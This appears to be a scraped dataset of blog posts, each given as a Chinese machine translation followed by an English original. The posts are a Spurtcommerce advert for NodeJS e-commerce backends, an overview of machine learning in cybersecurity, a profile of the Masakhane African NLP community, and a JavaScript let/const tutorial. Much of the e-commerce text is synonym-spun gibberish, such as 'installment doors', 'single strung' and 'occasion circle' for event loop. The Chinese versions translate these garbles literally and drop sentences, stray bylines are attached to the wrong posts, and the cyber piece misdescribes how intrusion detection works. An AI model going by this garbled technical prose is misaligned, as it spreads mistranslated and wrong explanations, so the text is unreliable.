大部分组织都非常注重拥有最佳外观和信念，并且 UX/UI 计划吸引他们的客户。 这显然是一个重要的角度，因为只要您的零售门面精美、迷人并与之联系，客户就会从购物的机会中获得乐趣。 尽管如此，如果您的应用程序存在多功能性问题，并且忽略了创建、跟上数据并将数据传送到用户的前端表示，那么，此时，这种 UI 的用途是什么？

问题#2：开发一个适应性强的电子商务连接点很麻烦：

基于 Web 的业务应用程序基本上受制于许多组件，例如分期付款门、社交登录、操作、运输、提供商和项目索引。 所有这些组件的设置都将电子商务入口置于令人难以置信的环境中，代表了跟上精英执行力的测试。

问题#3： App的前端在很大程度上受制于后端：

这样，由于电子商务网关在很大程度上依赖于一些组件，它可以回拨后端练习，影响应用程序及其演示。 在后端，将同时进行请求，应用程序的权重可以处理从前端发送的瞬间发送的成千上万的请求。 全球范围内的大量客户将不断地点击他们的移动应用程序，向后端发送各种请求。 更重要的是，处理如此大量的请求无疑是一种考验。 更重要的是，当后端在日常前提下处理如此大量的请求时，它会随着加载时间的增加而延迟，最终影响您的互联网搜索者排名。

解决办法是什么
你应该真正开始考虑将你的后端改成 NodeJS。 改变电子商务的技术堆可以如何帮助您。

对于 Web 应用程序的店面，Angular、React 和 Vue 以及移动应用程序的 Flutter 和 React Native ——每一个都是最理想的决定。 尽管如此，后端 NodeJS API 启用了这些店面。

让我们了解 NodeJS 如何扮演英雄：
由于其他网络进步，这是不可能的，因为每次招标都会带来额外的危险。 这会消耗整个内存，直到处理结束。

同样，NodeJS 帮助设计人员有效地利用场合圈和 I/O 活动的回调。 场合循环是 NodeJS 的不可思议的特性，它可以将长期运行的请求分解为更适度的部分。

这是 NodeJS 最重要的组件，因为处理新任务是同时发生的。 这就是为什么电子商务中的 NodeJS 后端可以处理成百上千个请求的重要动机，即使有大量客户同时发出请求。

是时候改变了
目前，不再忍受假设您的电子商务入口通道因持续的流量潮汐而崩溃？ 立即切换到具有 Spurtcommerce 的 NodeJS 后端 API，让您的电子商务业务以超高速运转。 如需更多数据，请访问www.spurtcommerce.com



原文:

Significant Issues looked by eCommerce Sector
The interest for eCommerce is rising step by step and it is making our lives smoother and bother free, fulfilling all our shopping needs, notwithstanding the severely hit pandemic. In any case, the rising reliance on eCommerce is likewise rising the interest for a more intelligent eCommerce advancement.

There were days sooner, when the retailers just needed to foster a straightforward eCommerce site with a back end. However, presently, expansion in use of advanced cells and the interest for versatile applications is turning into the most widely recognized pattern.

Nonetheless, we want to comprehend the most well-known issues that are being looked during eCommerce advancement:

Issue # 1: A wonderful front end with unfortunate back end - which is a danger to the eCommerce business:

A large portion of the organizations well spotlight on having the best look and believe and UX/UI plans to draw in their clients. It is obviously a significant angle on the grounds that, provided that your retail facade is wonderful, alluring and connecting with, the Customers will get a kick out of the chance to shop. Notwithstanding, if your application has versatility issues and neglects to create, keep up with and convey data to the front end presentations of the User, then, at that point, what is the utilization of such a UI?

Issue # 2: Developing an adaptable eCommerce connection point is something troublesome:

Web based business applications are fundamentally subject to numerous components, for example, installment doors, social logins, operations, transportation, providers and item index. All set up these components put the eCommerce entrance into a mind boggling circumstance, representing a test to keep up with elite execution.

Issue # 3: The front finish of the App is to a great extent subject to the back end:

In this way, as the eCommerce gateway is to a great extent reliant upon a few components, it could dial back the back-end exercises, influencing the App and its presentation. At the back end, there will be simultaneous solicitations, with a weight for the application to handle hundreds and thousand of solicitations that are in a flash being sent from the front end. An enormous number of clients, across the globe will be continually tapping their Mobile App, sending various solicitations to the back end. What's more, handling such immense number of solicitations is most certainly testing. What's more, when the back end should deal with such enormous number of solicitations on an everyday premise, it gets delayed with expansion in load time, at last influencing your internet searcher rankings.

What is the Solution
You ought to genuinely begin pondering changing your back finish to NodeJS. How changing the tech heap of your eCommerce can help you.

For fostering a Storefront, Angular, React and Vue for web applications and Flutter and React Native for Mobile Apps - every one of these are the most ideal decisions. Nonetheless, Back end NodeJS API enables these Storefronts.

Allow us to comprehend how NodeJS can act the hero:
NodeJS has the ideal capacity to deal with numerous simultaneous solicitations of the Users all at once - this magnificence comes to NodeJS with its single strung and occasion driven design properties. This is impossible on account of other web advances, where an extra danger gets made for each solicitation. This consumes the entire memory until the handling moves past.

Likewise, NodeJS assists designers with productively utilizing occasion circle and callbacks for I/O activities. The occasion circle is an inconceivable nature of NodeJS for breaking the long-running solicitation into more modest pieces.

NodeJS will likewise continually check work line each couple of milliseconds. This is the most considerable component of NodeJS, as the handling of new errands happen at the same time. This is the significant motivation behind why NodeJS back end in eCommerce can handle hundreds and thousands of solicitations even with an enormous number of clients giving simultaneous solicitations.

Time to Change
Presently, endure no more assuming your eCommerce entryways are crashing because of continuous traffic tidal waves? Switch over to NodeJS Back End API with Spurtcommerce today and get your eCommerce business rolling at super speed. For more data, visit www.spurtcommerce.com

item.title: 网络安全中的机器学习 | Machine Learning In Cyber Security
item.description:
有没有想过为什么 IDS（入侵检测系统）和 IPS（入侵防御系统）工作得如此准确？ 工具如何绕过验证码系统？ 如何仅使用脚本就可以检测到恶意软件？ 实时网络犯罪地图如何运作？ 现在这一切都可以回答了:)

什么是机器学习？

机器学习是对计算机算法的研究，可以通过经验和使用数据自动改进，在机器学习中，我们基于样本数据构建模型，我们称之为训练数据，然后可以将其用于做出预测或决策，而无需编程这样做。人们认为机器学习被视为人工智能的一部分。

什么是网络安全？

网络安全也称为计算机安全或信息技术安全，是保护计算机系统和网络免受信息泄露、盗窃或软件、硬件或电子数据损坏以及某公司提供的服务中断的保护。 网络安全有很多专业人士擅长的子领域，所有这些领域都有其主要功能。

过去几年发生了很多网络攻击和犯罪，最近乌克兰和俄罗斯之间也发生了某种网络“战争”，这将是解释机器学习可以做什么的一个很好的例子在网络安全。

地理围栏

俄罗斯一直在收到来自不同地方的大量洪水请求，这些请求使被洪水淹没的服务器变得不可用或需要更长的时间来加载或中断托管的服务，这种攻击被称为 DOS（拒绝服务）或 DDOS （分布式拒绝服务）攻击，举一个 Twitter 中关于mil.ru的趋势推文的例子，给出我是一个茶壶响应，代码为 418，基本上那里发生的事情被称为地理围栏，它是当你在某些区域之间设置边界时或仅适用于所有区域，这可以借助机器学习系统软件来完成，该系统软件经过编程，可以理解和决定以及知道访问该站点的 IP 是否来自该国家以及是否使用 VPN（虚拟专用网络） ) 作为来自国家的行为，它将检测 VPN 的供应商节点以及 tor 节点并决定是否进行身份验证。

入侵检测系统

入侵检测系统试图发现系统的入侵，以确认系统是否容易受到攻击。 入侵可以命名为异常或攻击，缩写IDS可以用来指代入侵检测系统，其工作思路是通过监控系统活动或网络来完成的。 入侵防御系统

这可以防止要在系统中进行的入侵，因此它首先确认系统是否容易受到攻击，然后决定先前基于 CVE 的训练数据模型，然后防止此类攻击，而无需编程以防止某些攻击，但只是从以前训练的模型中体验。

自动化任务

机器学习在网络安全中的潜力可以简化重复且耗时的过程，例如分类情报、恶意软件检测、网络日志分析和漏洞分析，这是一个显着的优势。 通过将机器学习添加到安全工作流程中，企业可以更快地完成活动，并以仅靠人工能力无法做到的速度响应和补救风险。 当开发中的重复过程被自动化以帮助分析师、数据科学家和开发人员提高生产力时，这被称为 AutoML。

网络风险评分

为网络段分配风险等级的定量方法有助于组织确定资源的优先级。 机器学习可用于检查先前的网络攻击数据集，并发现哪些网络区域更频繁地成为某些攻击的目标。 对于特定的网络区域，该分数可以帮助评估攻击的机会和影响。 因此，组织不太可能成为未来攻击的目标。

网络钓鱼

是的，我的意思是，有传统的网络钓鱼检测算法，但它们不够快或不够准确，无法识别和区分无辜和恶意 URL。 为了实现这一点，必须对模型进行电子邮件标题、正文数据、标点符号等特征的训练，以便对发送给组织的无辜 URL 和恶意 URL 进行分类和区分。

更重要的是？

机器学习是多么强大的技术！ 重要的是要记住，虽然技术在进步，AI 和 ML 正在快速发展，但技术的强大程度取决于设法使用它的分析师的大脑：）黑帽（恶意行为者）总是会提高他们的技能和技术，以利用大多数人使用的趋势技术。 为了能够识别和快速响应随时可能发生的威胁，结合迄今为止最好的技术和程序很重要:)



原文:

Ever wondered why IDS(Intrusion Detection System) and IPS(Intrusion Prevention System) works so accurately? How does a tool bypasses the Captcha system? How malwares can be detected with just a script? How real time cyber crime mapping works? Now then this all can be answered :)

What is Machine Learning?

Machine Learning is the study of computer algorithms that can improve automatically by experience and by use of data , In machine learning we build a model based on sample data that we call training data which can then be used to make predictions or decisions without being programmed to do so.It is considered that machine learning is seen as a part of Artificial Intelligence.

What is Cyber Security?

Cyber security also known as computer security or information technology security is the protection of computer systems and network from information disclosure , theft , or damage to software , hard wares or electronic data as well as disruption of services a certain company provides. Cybersecurity has a lot of sub-fields that professionals specialize in and all those fields have their major functionalities.

There has been a lot of cyber attacks and crimes performed in the past few years and also recently there has been a cyber"war-fare" of some sort between Ukraine and Russia which will be a good example of explaining to what machine learning can do in Cyber Security.

Geo Fencing

Russia has been receiving a lot of flooding requests coming from different places that made the servers that were being flooded to become unavailable or take much longer to load or disrupt the service being hosted , This attack is known as DOS(Denial Of Services) or DDOS(Distributed Denial Of Services) Attack , Giving an example of the trending tweets in twitter about mil.ru giving I'm a Teapot response which is code 418 , Basically what happened there is known as Geo Fencing it's when you set boundaries between certain areas or just to all areas , This can be done with the help of machine learning a system software programmed to understand and decide as well as know if an IP visiting the site is from the country or not and whether it's using a VPN(Virtual Private Network) to act as from the country it will detect the vendor nodes of the VPN as well as tor nodes and decide to authenticate or not.

Intrusion Detection Systems

The intrusion detection systems try to find intrusions of system, to confirm if the system is vulnerable to attack. Intrusions can be named anomalies or attacks, the abbreviation IDS can be used to refer to Intrusion detection systems, its work idea done by monitoring system activities or network. IDS currently have model where as it can go through the data of previous performed attacks methods and techniques and tactics and then try redo the attacks to prove if it's vulnerable.

Intrusion Prevention Systems

This prevents intrusions that are to be done in the system , so it first confirms if the system is vulnerable to attack and then decides upon the trained data models of previous based CVE(s) and then prevents such attacks without being programmed to prevent on the certain attack but just experiencing from the previous model which was trained.

Automating Tasks

The potential of machine learning in cyber security to simplify repetitive and time-consuming processes like triaging intelligence, malware detection, network log analysis, and vulnerability analysis is a significant benefit. By adding machine learning into the security workflow, businesses may complete activities quicker and respond to and remediate risks at a rate that would be impossible to do with only manual human capabilities. AutoML is a term used to describe the process of using machine learning to automate activities. When repetitive processes in development are automated to help analysts, data scientists, and developers be more productive, this is referred to as AutoML.

Network Risk Scoring

Quantitative methods for assigning risk rankings to network segments aid organizations in prioritizing resources. Machine Learning may be used to examine prior cyber-attack datasets and discover which network regions were more frequently targeted in certain assaults. With regard to a specific network region, this score can assist assess the chance and effect of an attack. As a result, organizations are less likely to be targets of future assaults.

Phishing

And yes I mean it , there have been traditional phishing detection algorithms but they aren't fast enough or accurate enough to identify and distinguish between innocent and malicious URLs. And to accomplish that , the models must be trained on characteristics such as email headers , body data , punctuation patterns , and more in order to categorize and distinguish the between innocent URLs and malicious URLs sent to the organization.

What's More?

What a powerful technology Machine Learning is! It is crucial to remember that, while technology is improving and AI and ML are progressing at a rapid pace , technology is only as powerful as the brains of the analysts who manage to use it:)BlackHats(malicious actors) will always improve their skills and technologies in order to exploit trending technologies used by most . To be able to identify and respond quickly to such threats that might happen any time it is important to combine the best technologies and procedures to date :)

item.title: MASAKHANE 在 NLP 领域所做的惊人工作 | THE AMAZING WORKS DONE BY MASAKHANE IN NLP SPACE
item.description:
安东尼·米帕瓦

发表于再次嗨，欢迎阅读这篇内容丰富的新文章，该文章介绍了一个很棒的社区，他们在为非洲人加强非洲语言的自然语言处理(NLP) 研究方面做着非常了不起的工作。

非洲有 2000 多种语言。 尽管如此，非洲语言只占自然语言处理(NLP) 中可用资源和出版物的一小部分。 这是由于多种因素造成的，包括缺乏政府和资金的关注、可发现性、缺乏社区、纯粹的语言复杂性、复制论文的困难以及没有比较技术的基准。

关于正汉

它旨在建立一个自然语言处理研究人员社区，连接并发展它，促进和分享进一步的研究，以实现语言保存、工具构建，并提高其全球知名度和相关性。

此外，建立一个社区，帮助发现分布式研究的最佳实践，以供其他新兴研究社区应用。

如果您热衷于基于 NLP 解决非洲挑战，Masakhane 可以无障碍、开放地获得第一次使用非洲语言的 NLP 实践经验。 使任何人都可以在自己选择的并行语料库上训练机器翻译模型，并在线共享结果。

它不需要学术先决条件来进行研究或为 Masakhane 社区做出贡献。

你猜怎么了？ 您对我如何与这个很棒的社区建立联系有疑问吗？

真棒图像| 土坯股票

想成为马萨哈尼人吗？ 不用担心，Masakhane 有他们活跃的 Slack 工作区和邮件列表组，您可以在其中找到所有手头的更新和研究。

作品由 Masakhane 完成

  1. 从不同角度将人们联系起来解决基于非洲语言的研究问题： Masakhane 社区的任何研究人员都很容易开始研究他/她可能喜欢的任何语言，仅仅因为母语使用者的支持就在那里，你不需要不想担心学习如何解决挑战的非洲语言。 我看到许多来自国外的人对斯瓦希里语研究感兴趣，并支持在 Masakhane 社区中以斯瓦希里语为母语的人完成他们的项目，这太棒了，可以帮助世界各地的人们了解不同的文化和语言。
  2. 非洲语言机器翻译： Masakhane 有一个开源在线网络，用于仅针对非洲语言的机器翻译服务。 如果您想为这个项目做出贡献，用您的语言训练模型或想与 Masakhane 合作和工作，请在https://github.com/dsfsi/masakhane-web中了解如何做，或联系任何 Masakhane网络贡献者。 非洲语言项目的机器翻译现在有 52 种非洲语言的基准，可以在 Masakhane 项目的Github 页面上看到。
  3. 非洲语言的语言模型： Masakhane 社区能够发表有关非洲语言模型的不同论文，这是打破非洲语言模型可用性障碍的惊人举措之一。 您可以在此处找到该出版物。
  4. 数据收集： Masakhane 社区完成的数据收集项目之一是东非文本和语音，旨在为来自乌干达、坦桑尼亚的资源匮乏的东非语言提供开放、可访问和高质量的文本和语音数据集和肯尼亚。 该项目专注于以下语言的数据：Luganda、Runyankore-Rukiga、Acholi、Swahili 以及乌干达和肯尼亚之间跨境的 Luhya Languages 的一个子集。 在此处阅读有关该项目的更多信息。
  5. 非洲名称的命名实体识别：该项目的名称为MasakhaNER 。 该项目侧重于信息提取和从信息检索中识别非洲人的姓名、地点和人物。 由于非洲语言的大多数现有 NER 数据集是 WikiNER，它们是自动注释的并且非常嘈杂，因为非洲语言的文本质量没有得到验证。 只有少数非洲语言具有人工注释的 NER 数据集。 您可以在 Masakhane Github 页面上找到该项目。

你可以如何贡献？

  1. 训练模型：根据您想要贡献的研究问题，您可以作为 Masakhane 社区成员参与不同模型的训练。
  2. 文档：您可以选择成为帮助记录项目和编写正在进行的项目进度的成员。
  3. 分析：如果你真的喜欢对模型和数据进行分析，可以通过 Masakhane 参与分析非洲语言的数据集，解决各种问题。
  4. 数据：人们有兴趣使用新技术来提升自己的语言。 没有人很高兴看到他们的语言在各种平台上以错误的方式构建，这是您通过 Masakhane 社区中的数据收集活动做出贡献的机会，以增加研究人员、数据科学家、软件开发人员和其他人对数据的可访问性解决非洲挑战。
  5. 指导：您可以通过提供建议或帮助来为您喜欢或您有经验的语言调整模型做出贡献，并帮助人们入门。 这可以应用于想要对您的原籍语言进行研究的成员，因此为他们的工作提供支持和赞美是最佳实践来解决非洲语言特定挑战的好方法。
  6. 计算基础设施：如果你有计算基础设施，并且你真的很喜欢支持 Masakhane 计划，但你没有时间专注于训练各种 NLP 模型，那么只需帮助社区提供基础设施，或者你可以捐赠。
  7. 头脑风暴：您可以参加每周会议，并根据主题提出建议、想法或建议。 此外，如果您的社区中存在可以通过 NLP 技术解决的现有挑战，请随时与 Masakhane 社区分享，以找到解决该挑战的最佳方法。

目前

研究机构正在大力投资 Masakhane，将其作为任何所需资源的中心平台，以在其作品中包含一种或多种非洲语言。 组织、公司和投资者也加入其中，与 Masakhane 成员合作开展几个以非洲语言为核心的项目。 现在投资 Masakhane 有很多好处，因为当我们谈论非洲语言的自然语言处理时，这是最热门的事情。

感谢您抽出宝贵时间阅读本文，希望能帮助您了解自然语言处理在非洲语言环境中的进展，以及如何参与为 Masakhane 社区发起的倡议做出贡献。

Anshaj Khare - Anshaj Khare - Apr 14 '20 20 年 4 月 14 日



原文:

Anthony Mipawa

Posted on May 20

Hi once again, welcome to this new informative article about an awesome community doing really amazing work on strengthening  Natural Language Processing (NLP) research in African languages, for Africans.

Africa has over 2000 languages. Despite this, African languages account for a tiny portion of available resources and publications in Natural Language Processing (NLP). This is due to multiple factors, including a lack of focus from government and funding, discoverability, a lack of community, sheer language complexity, difficulty in reproducing papers, and no benchmarks to compare techniques.

About Masakhane

Masakhane is a research effort originally for Machine translation focused on African languages that are open-source, continent-wide, distributed online. It aimed to build a community of Natural Language Processing researchers, connect and grow it, spurring and sharing further research to enable language preservation, tool building, and increasing its global visibility and relevance.

Masakhane pushing to build datasets and tools to facilitate Natural Language Processing in African languages and pose new research problems to enrich the NLP  research landscape.

Also, to build a community that will help to discover best practices for distributed research, to be applied by other emerging research communities.

The best about Masakhane, it uses smooth methodologies which don't require any experience of NLP to be connected with the community. If you are passionate about solving African challenges based on NLP, Masakhane is barrier-free, open access to first hands-on NLP experience with African languages. Enable anyone to train Machine translation models on a parallel corpus of their own choice and the results shared online.

It requires no academic prerequisites to conduct research or contribute to the Masakhane community.

Guess what? have a question in your mind about how I can connect with this awesome community?

Awesome images | Adobe Stock

Want to be Masakhanian? Don't worry, here you go, Masakhane has their active slack workspace and mailing list group, where you can find all the updates and research at hand.

Works are done by Masakhane

  1. Connecting people from different perspectives on solving research problems based on African language: It is simple for any researcher in the Masakhane community to start research on any language he/she could prefer simply because the support from the native language speaker is there, you don't want to worry about learning the African language that you what to solve a challenge with. I have seen many people from abroad interested in Swahili research and supported to complete their project by native Swahili speakers in the Masakhane community, this is awesome and helps people across the world to understand different cultures and languages.
  2. Machine Translation for African languages: Masakhane has an open-source online web for machine translation services for solely African languages. Masakhane Web is the platform that aims at hosting the already trained machine translation models from the Masakhane community and allows contributions from users to create new data for retraining and improving the models. If you would like to contribute to this project, train a model in your language or want to collaborate and work with Masakhane, find out how in https://github.com/dsfsi/masakhane-web or reach out to any of the Masakhane Web contributors. The machine translation for the African language project now has 52 African languages with benchmarks which can be seen on the Masakhane project's Github page.
  3. Language models for African Languages: The Masakhane community is able to publish different papers about African language modeling, this is among amazing initiatives on breaking the barrier of African language model availability. You can find the publication here.
  4. Data Gathering: One of the data collection projects done by the Masakhane community is Text & Speech for East Africa, which was aimed to deliver open, accessible, and high-quality text and speech datasets for low-resourced East African languages from Uganda, Tanzania, and Kenya. The project was focused on data for the languages: Luganda, Runyankore-Rukiga, Acholi, Swahili, and a subset of Luhya Languages which are cross-border between Uganda and Kenya. Read more about the project here.
  5. Named Entity Recognition for African Names: The project goes with the name MasakhaNER . The project focused on information extraction and identifying African names, places, and people from information retrieval. Since the majority of existing NER datasets for African languages are WikiNER which are automatically annotated and are very noisy since the text quality for African languages is not verified. Only a few African languages have human-annotated NER datasets. You can find the project on the Masakhane Github page.

How you can contribute?

  1. Training a model: depending on the research problem you want to contribute you can just take part in training different models as a Masakhane community member.
  2. Documentation: You can opt to be part of members that help in documenting projects and writing progress about ongoing projects.
  3. Analysis: If you really like to perform analysis of models and data, through Masakhane you can take part in analyzing datasets of African languages to solve various problems.
  4. Data: People are interested in using new technology to advance their own languages. No one is happy seeing their languages are framed in a wrong way on various platforms, this is a chance for you to contribute through data collection activities in the Masakhane community to increase the accessibility of data for researchers, data scientists, software developers, and others to solve African challenges.
  5. Mentorship: You can contribute by providing advice or help to tune models for the languages you prefer or you had experience with and help people get started. This can be applied to members that want to apply research on the language of your origin, so providing support and compliment to their work is the great way to make the best practice of addressing specific challenges of the African language.
  6. Computation infrastructure: If you have computing infrastructures and your really love to support Masakhane initiatives but you don't have time to focus on training kinds of NLP models, just help the community with the infrastructures or you can just donate.
  7. Brainstorm: You can just join weekly meetings and contribute with suggestions, ideas, or advice depending on the topic. Also if you have an existing challenge within your community that can be solved by NLP technologies feel free to share with the Masakhane community to find the best way of solving that challenge.

Currently

Masakhane is gaining momentum in the world right now. Research institutions are heavily investing in Masakhane as a central platform for any needed resources to include one or more African languages in their works. Masakhane has many research collaborations with Google, Facebook as well as institutions in Africa. Organizations, companies, and investors are joining, too, by working together with Masakhane members on several projects which are at the core of African languages. There is much to gain from investing in Masakhane right now, as it is the hottest thing when we talk about natural language processing for African languages.

Thank you for taking your time to read this article, hope helps you to understand the progress of Natural language processing in the African language context and how you can take part in contributing to the initiatives started by the Masakhane community.

Anshaj Khare - Apr 14 '20

item.title: 深入了解 JavaScript 变量 II | Deep Diving into JavaScript Variables II
item.description:
在上一篇文章中，我解释了使用var关键字完成的声明的scope和行为。

在这篇文章中，我们将探讨let和const声明、它们的区别以及它们如何比var更好。

内容

关键字让

  • 如果您希望占位符保存随时间变化的值，请使用let 。
  • 虽然var是害群之马，但let是 JavaScript 家族的宠儿。
  • 句法

    let variableName [= value];

    • 用let声明的变量具有块作用域。
    • 这意味着，如果一个使用let的变量在一个块中声明，那么它只能在该块和子块内的任何地方访问。

    出租范围

    • 我们将通过一些示例了解作用域的工作原理

      • 在上面的示例中，在 test() 中声明的变量和在 if 块中声明的变量是 2 个不同的变量。 那就是它们的引用（内存地址）不同。
      • 上述代码的输出是 -
      • 让我通过控制台向您展示这一点。
      • 因此，对 if 块中声明的变量所做的任何更改都不会反映在函数中定义的变量中。

    让声明和全局对象

    • 与var不同， let不附加到全局对象（或globalThis ）。

    • 这意味着在任何 JavaScript 环境中，您都无法使用全局对象访问使用let声明的变量。

    • 例如，在浏览器中，您有全局window ，但您不能执行以下操作 -

      • 在以下示例中， x是全局声明的，您不能使用window.x来获取 x 的值。

    • 这就是使用let声明的变量优于使用var声明的变量的原因。 它们提供了一层保护并确保它们保持在本地范围内。
      • 如果您在控制台中看到范围选项卡，您会发现全局声明的 x 出现在Script范围下。

    让申报和吊装

    • 使用 let ARE HOISTED的变量声明，但提升的工作方式与使用var声明时提升的变量完全不同。
    • 如果你运行上面的代码，你会得到一个在初始化之前无法访问变量的ReferenceError 。

    请注意，错误消息可能因浏览器而异。

    • 但是，我们刚刚看到 let 声明被提升了。 在var的情况下，提升的声明在代码执行之前分配了内存，并且还自动初始化为undefined 。 如果我在上述代码的第一行添加调试器并运行，您会看到在范围选项卡中， count和user变量在代码执行之前分配了内存并自动初始化为未定义。
    • 此外，您还将看到一个细节，与变量admin不同， count变量具有范围Script 。
      • 这表明let变量不是全局对象的一部分，它们在不同的范围内分配内存（在本例中为Script ）。
    • 通常，在初始化之前不能访问let声明，当你这样做时，你会收到一个 ReferenceError。
    • 现在，使用let声明的变量被称为从分配内存到初始化时处于临时死区或TDZ中。
    • 下面的屏幕截图显示了上述代码的变量count的 TDZ 时间。

    • 因此，当变量在其 TDZ 中时，您无法访问它。 如果你这样做，你会得到一个ReferenceError 。
    • 让和重新声明
      • 您不能使用 let 重新声明已在同一范围内以相同名称声明的变量。 如果这样做，您将收到 SyntaxError。
      • 查看下面的代码片段。

      • 查看上述代码的输出 -

      • 您也不能使用let声明以前使用var声明的具有相同名称和相同作用域的变量。

      关键字常量

      • 如果你有一个价值并且你知道它永远不会改变并且永远保持不变怎么办？
      • 这是第 3 种声明类型出现的地方——使用关键字const的常量声明。
      • 顾名思义， const用于声明永远不会随时间改变的常量值。

      声明时需要用值初始化常量。

    • 用const声明的变量也有块作用域。

    • 这意味着，如果一个变量在一个块中使用const声明，那么它只能在该块和子块内的任何地方访问。

    • 那么 let 和 const 有什么区别呢？ 不同的是——

      1. 您不能将任何值重新分配给常量变量
      2. 常量变量在声明时需要初始化。

    • 下面的代码片段显示了如何声明一个常量。

    • 上述代码的输出 -

    • 就像我上面提到的，您需要在声明时初始化一个常量变量。 如果没有，您将收到如下代码片段的屏幕截图所示的SyntaxError 。
      常量范围

      • 让我们通过控制台查看变量的范围-

      • 如您所见，与使用let的声明类似，全局定义的常量也在Script范围内分配内存。

      • 让我们看另一个例子。 让我们在 if() 块中尝试一个重复的变量，看看会发生什么。

      • 上述代码的输出是 -

      • 在上面的示例中，在 if 块之外声明的常量和在 if 块中声明的常量是 2 个不同的常量。 那就是它们的引用（内存地址）不同。

        • 让我通过控制台向您展示这个常量的范围。
        • 因此，对 if 块中声明的常量所做的任何更改都不会反映在函数中定义的常量中。

      与let类似，使用const声明的变量不附加到全局对象（或globalThis ）。

    • 这意味着在任何 JavaScript 环境中，您都不能使用全局对象访问使用const声明的变量。

    • 例如，在浏览器中，您有全局window ，但您不能执行以下操作 -

      • 在以下示例中， x是全局声明的，您不能使用window.x来获取 x 的值。

    使用const的变量声明也被提升，并且提升的工作方式类似于使用let声明时提升的变量。

  • 如果你运行上面的代码，你会得到一个在初始化之前无法访问变量的ReferenceError 。

请注意，错误消息可能因浏览器而异。

  • 与let声明类似，通常在初始化之前不能访问const声明，当你这样做时，你会收到一个 ReferenceError。
  • 使用 `const 声明的变量被称为从它被分配内存（从它的范围开始）到它被初始化的时间的时间死区或TDZ 。
  • 下面的屏幕截图显示了上述代码的变量USER的 TDZ 时间。

您不能使用已在同一范围内以相同名称声明的 const 重新声明变量。 如果这样做，您将收到 SyntaxError。

  • 查看下面的代码片段。

  • 查看上述代码的输出 -

  • 就像 let 一样，您也不能使用const来声明以前使用var声明的具有相同名称和相同作用域的变量。

    • 概括

    这就是这个博客的全部内容。 呸！ 现在，我知道这个系列很多，但这是最重要的概念之一，经常在采访中被问到。

    为了使事情更简单，这里有一个流程图，引用了let 、 const和 'var` 声明之间的区别。

    谢谢你坚持到最后。
    如果这对您有帮助，请分享，我也很想听听您的想法！

    Zujaj Misbah Khan - Zujaj Misbah Khan - May 16 5月16日



    原文:

    In the previous article, I explained about scope and the behaviour of declarations that are done using var keyword.

    In this post, we will explore let and const declarations, their differences, and how they are better than var.

    CONTENTS

    Keyword let

    • If you ever want a placeholder to hold values that changes over time, use let.
    • While var is the black sheep, let is a beloved amongst the JavaScript family.
    • let is stricter and more rigid than var in it's syntax rules and usage.

    Syntax

    let variableName [= value];

    • Variables declared with let have a block scope.
    • What this means is that, if a variable using let is declared within a block, then it is accessible anywhere only within that block and the sub-blocks.

    Scope of let

    • We'll understand how the scope works using some examples

      • In the above example, the variable declared inside the test() and the one declared within the if block are 2 different variables. That is their references (memory address) are different.
      • The output for the above code is -
      • Let me show you this through the console.
      • Hence, any change made to the variable declared within the if block does not reflect in the variable defined within the function.

    let Declaration and the Global Object

    • Unlike var, let is not attached to the global object (or globalThis).

    • This means that in any JavaScript environment, you cannot access a variable declared using let using the global object.

    • e.g., in browsers, you have the global window and you cannot do the following-

      • In the following example, where x is declared globally, you cannot use window.x to get the value of x.

    • This is the reason variables declared using let are preferred over those declared with var. They provide a layer of protection and ensure that they remain local scoped.
      • If you see the scope tab in the console, you will find that the globally declared x appears under the Script scope.

    let Declaration and Hoisting

    • Variable declarations using let ARE HOISTED, but the hoisting works quite differently from variables that are hoisted when declared using using var.
    • If you run the above code, you'll get a ReferenceError that the variable cannot be accessed before initializing.

    Note the error message could be different depending on the browser.

    • But, we just saw that let declarations are hoisted. And in the case of var, the hoisted declarations were allocated memory prior to the code execution and also auto initialized to undefined. What about let declarations?
    • Let us check if memory allocation and auto initialization happens with let declarations before code execution, on the chrome browser console.

    • If I add a debugger on the first line in the above code and run, you'll see that in the scope tab, the count and user variables are allocated memory before the code execution and auto initialized to undefined.
    • Moreover, you will also see a detail that unlike the variable admin, the count variable has a scope Script.
      • This shows that let variables are not part of the global object, they are allocated memory in a different scope (In this case Script).
    • As a rule, let declarations cannot be accessed before initializing and when you do so, you'll receive a ReferenceError.
    • Now, a variable declared using let is said to be in the Temporal Dead Zone or TDZ from the time it was allocated memory to the time it is initialized.
    • The below screenshot shows the TDZ time for the variable count for the above code.

    • So, when a variable is in it's TDZ, you cannot access it. If you do so, you'll get a ReferenceError.
    • A variable in TDZ be like- *Can't access

    let and Redeclarations

    • You cannot re-declare a variable using let that was already declared with the same name within the same scope. If you do so, you will receive a SyntaxError.
    • Check out the code snippet below.

    • Check out the output for the above code-

    • You also cannot declare a variable using let that was previously declared using var with the same name and within the same scope.

    Keyword const

    • What if you have a value and you know that it's never going to change and will always remain the same?
    • This is where a 3rd type of declaration comes in - constant declarations using keyword const.
    • As the name suggests, const is used to declare constant values that will never change over time.

    const Declaration Syntax

    const variableName = value;

    • It is required to initialize a constant with a value during declaration.
    • Variables declared with const also have a block scope.

    • What this means is that, If a variable is declared using const within a block, then it is accessible anywhere only within that block and the sub-blocks.

    • Then what's the difference between let and const? The difference is that -

      1. You cannot re-assign any values to a constant variable
      2. Constant variables need to be initialized when they are declared.

    • The below code snippet shows how you declare a constant.

    • Output for the above code -

    • Like I mentioned above, you need to initialize a constant variable when you declare. If not you will receive a SyntaxError as shown in the screenshot for the below code snippet.
      -Output for the code snippet above -

    Scope of const

    • The scope for const also works similar to the scope of let.

    • Let us see the scope of the variable via console-

    • As you can see, similar to declarations with let, globally defined constants are also allocated memory in the Script scope.

    • Let us look at another example. Let us trying a duplicate variable inside if() block and see what happens.

    • The output for the above code is -

    • In the above example, the constant declared outside the if block and the one declared within the if block are 2 different constants. That is their references (memory address) are different.

      • Let me show you the scope of this constant through the console.
      • Hence, any change made to the constant declared within the if block does not reflect in the constant defined within the function.

    const Declaration and the Global Object

    • Similar to let, variables declared using const are not attached to the global object (or globalThis).

    • This means that in any JavaScript environment, you cannot access a variable declared using const using the global object.

    • e.g., in browsers, you have the global window and you cannot do the following-

      • In the following example, where x is declared globally, you cannot use window.x to get the value of x.

    const Declaration and hoisting

    • Variable declarations using const ARE ALSO HOISTED, and the hoisting works similarly to the variables that are hoisted when declared using using let.
    • If you run the above code, you'll get a ReferenceError that the variable cannot be accessed before initializing.

    Note the error message could be different depending on the browser.

    • Similar to let declarations, as a rule, const declarations cannot be accessed before initializing and when you do so, you'll receive a ReferenceError.
    • The variable declared using `const is said to be in the Temporal Dead Zone or TDZ from the time it was allocated memory (from the beginning of it's scope) to the time it is initialized.
